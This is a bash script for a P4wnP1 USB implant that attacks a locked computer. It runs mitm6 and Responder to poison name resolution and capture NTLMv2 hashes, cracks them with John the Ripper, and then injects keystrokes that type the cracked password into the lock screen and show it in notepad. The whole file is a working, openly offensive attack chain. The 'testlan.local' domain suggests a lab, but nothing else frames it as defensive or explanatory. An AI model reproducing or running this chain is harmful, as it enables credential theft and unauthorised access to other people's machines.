#!/bin/bash

# Let's make the LED solid
P4wnP1_cli led -b 255

# Some inital setup before we start
rm -f /usr/share/responder/Responder.db && cp /root/backup.db /usr/share/responder/Responder.db
rm -f /usr/share/responder/DumpNTLMv2.txt
sysctl -p

# First, we will launch our mitm6 command
tmux new-session -d -s mitm6 '/usr/local/bin/mitm6 -v -i usbeth -d testlan.local'

# Second, we will launch our Responder command
tmux new-session -d -s responder 'responder -I usbeth -wFP'

# We launched the processes, make the led blink slowly
P4wnP1_cli led -b 1
echo "Tools now running"

# Now we wait for a victim user to connect, so we keep running the Dumper command every second
loop=1
while [ $loop ]
do
	# Run the Dumper command
	cd /usr/share/responder && python DumpHash.py >/dev/null
	output=$(cat /usr/share/responder/DumpNTLMv2.txt)
	# Check if a DumpNTLMv2.txt file
	if [ -n "$output" ]; then

		# If it exists, blink faster
		echo "Hash has been found...cracking..."
		P4wnP1_cli led -b 50

		# Let's crack the hash
		temp=$(mktemp)
		john --wordlist=/root/attack/wordlist.txt --format=netntlmv2 /usr/share/responder/DumpNTLMv2.txt --pot=$temp

		# List the cracked hash
		cracked=$(john --show --format=netntlmv2 /usr/share/responder/DumpNTLMv2.txt --pot=$temp | head -n 1 - | cut -d':' -f2 | grep -v 'password hash' | tr -d '\n')

		# Check if there has been a cracked hash
		if [ -n "$cracked" ]; then
			echo "Hash has been cracked! Logging in..."

			# Turn the LED solid
			P4wnP1_cli led -b 255

			# Insert the password into the locked screen
			P4wnP1_cli hid run -c "layout('us');typingSpeed(100,150);move(0,0);moveStepped(-500,-500);delay(3000);type('\n');delay(2000);type('$cracked');delay(2000);type('\n');delay(3000);press('WIN R');delay(500);type('notepad\n');delay(2000);type('The password was: $cracked');"
		else
			# Nothing has been cracked, turn the LED back slow
			P4wnP1_cli led -b 1
		fi

		# Regardless of whether a hash was cracked or not, kill the tmux sessions to stop the attack
		tmux kill-session -t mitm6
		tmux kill-session -t responder
		echo "Attack completed >:) Goodbye!"
		exit
	fi

	# Sleep every 1 second
	sleep 1
done
